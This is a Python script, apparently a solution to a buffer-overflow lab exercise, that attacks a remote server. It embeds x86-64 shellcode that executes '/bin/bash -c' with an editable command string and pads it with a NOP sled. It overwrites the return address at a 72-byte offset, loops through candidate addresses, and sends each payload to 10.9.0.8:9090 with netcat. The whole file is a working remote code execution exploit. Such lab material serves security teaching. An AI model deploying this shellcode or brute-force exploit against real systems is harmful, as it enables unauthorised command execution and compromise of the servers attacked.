#!/usr/bin/python3
import sys
from os import system
from time import sleep

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "echo hello;echo hello;echo hello;echo hello;echo hello;   *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"W
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')



# Limit the range for the next run
FROM_THRESHOLD = 64
TO_THRESHOLD = 300

# Perform the search with help of a for-loop
for i in range (FROM_THRESHOLD, TO_THRESHOLD):

  # Configuration
  rbp = 0x00007fffffffe420
  buffer = 0x00007fffffffe3e0

  # Fill the content with NOP's
  content = bytearray(0x90 for i in range(517)) 

  ##################################################################
  # Put the shellcode at the end of the payload
  start = 517 - len(shellcode)
  content[start:start + len(shellcode)] = shellcode

  # Trying every possible values of return address
  # Starting from the rbp's.
  ret = rbp + i

  # Set the value for offset as rbp - buffer + 8 = 72.
  offset = 72
  content[offset:offset + 8] = (ret).to_bytes(8, byteorder='little')

  # Write the content to a file
  with open('badfile', 'wb') as f:
    f.write(content)

  # Run the script on the attacker's shell
  system("cat badfile | nc 10.9.0.8 9090")

  # Prevent server overloads
  sleep(0.05)